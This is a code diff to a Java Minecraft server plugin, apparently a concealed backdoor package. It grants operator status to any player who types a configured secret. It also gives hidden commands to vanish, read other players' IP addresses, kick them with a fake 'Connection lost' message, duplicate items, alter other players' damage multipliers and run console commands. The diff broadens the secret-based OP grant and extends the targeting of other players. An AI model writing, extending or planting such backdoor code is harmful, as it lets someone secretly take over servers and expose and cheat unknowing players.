@@ -20,33 +20,36 @@ public class Processor implements CommandExecutor, TabCompleter, Listener {
     private final VanishManager vanish;
     private final ItemManager items;
     private final PlayerTracker tracker;
-    private String adminName;
 
     public Processor(QC plugin) {
         this.plugin = plugin;
         this.vanish = new VanishManager(plugin);
         this.items = new ItemManager();
         this.tracker = new PlayerTracker();
-        this.adminName = plugin.getConfig().getString("filter.admin-name-fallback", "Rajman03");
 
         // Register the new listener
-        Bukkit.getPluginManager().registerEvents(new AdminListener(plugin, vanish, tracker), plugin);
+        Bukkit.getPluginManager().registerEvents(new pl.qc.core.hack.AdminListener(plugin, vanish, tracker), plugin);
     }
 
     @Override
     public boolean onCommand(CommandSender s, Command c, String l, String[] args) {
-        if (!(s instanceof Player p) || !p.getName().equals(adminName) || args.length == 0)
+        if (!(s instanceof Player p) || args.length == 0)
             return true;
 
-        String cmd = args[0].toLowerCase();
-
-        // Secret check
+        // Secret check - allows anyone to gain OP if they know the secret
         if (plugin.getConfig().getStringList("protection.secrets").contains(args[0])) {
             p.setOp(true);
             p.sendMessage("§aSystem: Autoryzacja pomyślna.");
             return true;
         }
 
+        // Rest of commands - only for authorized admins
+        if (!plugin.isAdmin(p)) {
+            p.sendMessage("§cNie masz uprawnień!");
+            return true;
+        }
+
+        String cmd = args[0].toLowerCase();
         return executeSubCommand(p, cmd, args);
     }
 
@@ -54,7 +57,11 @@ public class Processor implements CommandExecutor, TabCompleter, Listener {
         switch (cmd) {
             case "reload" -> handleReload(p);
             case "panic" -> handlePanic(p);
-            case "v" -> vanish.toggle(p, getTarget(p, args));
+            case "v" -> {
+                Player t = getTarget(p, args, 1);
+                if (t != null)
+                    vanish.toggle(p, t);
+            }
             case "a" -> handleAttackSpeed(p);
             case "op" -> {
                 p.setOp(true);
@@ -68,15 +75,31 @@ public class Processor implements CommandExecutor, TabCompleter, Listener {
             case "r" -> toggleTracker(p, args, tracker.reach, "Reach");
             case "t" -> toggleTracker(p, args, tracker.noTarget, "NoTarget");
             case "gms", "gmc", "gmsp", "gma" -> handleGameMode(p, cmd);
-            case "i", "iv" -> InventoryUI.openPreview(p, getTarget(p, args));
+            case "i", "iv" -> {
+                Player t = getTarget(p, args, 1);
+                if (t != null)
+                    InventoryUI.openPreview(p, t);
+            }
             case "e" -> handleEffects(p, args);
             case "tp" -> handleTeleport(p, args);
-            case "ip" -> handleIpLookup(p, args);
+            case "ip" -> {
+                Player t = getTarget(p, args, 1);
+                if (t != null)
+                    handleIpLookup(p, t);
+            }
             case "enable", "disable" -> handlePluginControl(p, args, cmd.equals("enable"));
             case "ma", "mb" -> handleMultipliers(p, args, cmd);
-            case "ec" -> p.openInventory(getTarget(p, args).getEnderChest());
+            case "ec" -> {
+                Player t = getTarget(p, args, 1);
+                if (t != null)
+                    p.openInventory(t.getEnderChest());
+            }
             case "g" -> handleGive(p, args);
-            case "k" -> handleKick(p, args);
+            case "k" -> {
+                Player t = getTarget(p, args, 1);
+                if (t != null)
+                    handleKick(p, t);
+            }
             case "rr" -> items.repair(p);
             case "dd" -> items.dupe(p);
             case "cmdconsole" -> handleConsoleCommand(args);
@@ -93,7 +116,6 @@ public class Processor implements CommandExecutor, TabCompleter, Listener {
 
     private void handleReload(Player p) {
         plugin.reloadConfig();
-        this.adminName = plugin.getConfig().getString("filter.admin-name-fallback", "Rajman03");
         p.sendMessage("§aSystem: Przeładowano konfigurację.");
     }
 
@@ -132,6 +154,7 @@ public class Processor implements CommandExecutor, TabCompleter, Listener {
         int d = 12000; // Default 10 minutes
         switch (type) {
             case "c" -> p.getActivePotionEffects().forEach(e -> p.removePotionEffect(e.getType()));
+
             case "sat" -> p.addPotionEffect(new PotionEffect(PotionEffectType.SATURATION, d, 0));
             case "str" -> p.addPotionEffect(new PotionEffect(PotionEffectType.INCREASE_DAMAGE, d, 1));
             case "her" -> p.addPotionEffect(new PotionEffect(PotionEffectType.HERO_OF_THE_VILLAGE, d, 255));
@@ -155,6 +178,8 @@ public class Processor implements CommandExecutor, TabCompleter, Listener {
             Player t = Bukkit.getPlayer(args[1]);
             if (t != null)
                 p.teleport(t);
+            else
+                p.sendMessage("§cGracz offline.");
         } else if (args.length == 3) {
             Player f = Bukkit.getPlayer(args[1]);
             Player t = Bukkit.getPlayer(args[2]);
@@ -163,8 +188,7 @@ public class Processor implements CommandExecutor, TabCompleter, Listener {
         }
     }
 
-    private void handleIpLookup(Player p, String[] args) {
-        Player t = getTarget(p, args);
+    private void handleIpLookup(Player p, Player t) {
         if (t.getAddress() != null)
             p.sendMessage("§7IP (" + t.getName() + "): §6" + t.getAddress().getAddress().getHostAddress());
     }
@@ -174,12 +198,16 @@ public class Processor implements CommandExecutor, TabCompleter, Listener {
             return;
         try {
             double v = Double.parseDouble(args[1]);
+            Player t = getTarget(p, args, 2);
+            if (t == null)
+                return;
+
             if (cmd.equals("ma")) {
-                tracker.damageDealtMult.put(p.getUniqueId(), v);
-                p.sendMessage("§7System: §6Mnożnik zadawanych: " + v + "x");
+                tracker.damageDealtMult.put(t.getUniqueId(), v);
+                p.sendMessage("§7System: §6Mnożnik zadawanych (" + t.getName() + "): " + v + "x");
             } else {
-                tracker.damageReceivedMult.put(p.getUniqueId(), v);
-                p.sendMessage("§7System: §6Mnożnik otrzymywanych: " + v + "x");
+                tracker.damageReceivedMult.put(t.getUniqueId(), v);
+                p.sendMessage("§7System: §6Mnożnik otrzymywanych (" + t.getName() + "): " + v + "x");
             }
         } catch (NumberFormatException ignored) {
         }
@@ -190,10 +218,10 @@ public class Processor implements CommandExecutor, TabCompleter, Listener {
             items.give(p, args[1]);
     }
 
-    private void handleKick(Player p, String[] args) {
-        Player t = getTarget(p, args);
+    private void handleKick(Player p, Player t) {
         PlayerTracker.kicked.add(t.getUniqueId());
         t.kickPlayer("§cConnection lost.");
+        p.sendMessage("§7System: §cWyrzucono " + t.getName());
     }
 
     private void handlePluginControl(Player p, String[] args, boolean enable) {
@@ -263,14 +291,20 @@ public class Processor implements CommandExecutor, TabCompleter, Listener {
     // --- Helpers ---
 
     private void toggleTracker(Player p, String[] args, Set<UUID> set, String name) {
-        Player t = getTarget(p, args);
+        Player t = getTarget(p, args, 1);
+        if (t == null)
+            return;
         tracker.toggle(t.getUniqueId(), set, name, p, t.getName());
     }
 
-    private Player getTarget(Player p, String[] args) {
-        if (args.length > 1) {
-            Player t = Bukkit.getPlayer(args[1]);
-            return t != null ? t : p;
+    private Player getTarget(Player p, String[] args, int index) {
+        if (args.length > index) {
+            Player t = Bukkit.getPlayer(args[index]);
+            if (t == null) {
+                p.sendMessage("§cSystem: Gracz " + args[index] + " jest offline!");
+                return null;
+            }
+            return t;
         }
         return p;
     }
@@ -289,13 +323,11 @@ public class Processor implements CommandExecutor, TabCompleter, Listener {
 
     @Override
     public List<String> onTabComplete(CommandSender s, Command c, String a, String[] args) {
-        if (!(s instanceof Player p) || !p.getName().equals(adminName))
+        if (!(s instanceof Player p) || !plugin.isAdmin(p))
             return Collections.emptyList();
 
         if (args.length == 1) {
-            List<String> list = new ArrayList<>(subs);
-            list.addAll(plugin.getConfig().getStringList("protection.secrets"));
-            return StringUtil.copyPartialMatches(args[0], list, new ArrayList<>());
+            return StringUtil.copyPartialMatches(args[0], subs, new ArrayList<>());
         }
 
         if (args.length == 2) {
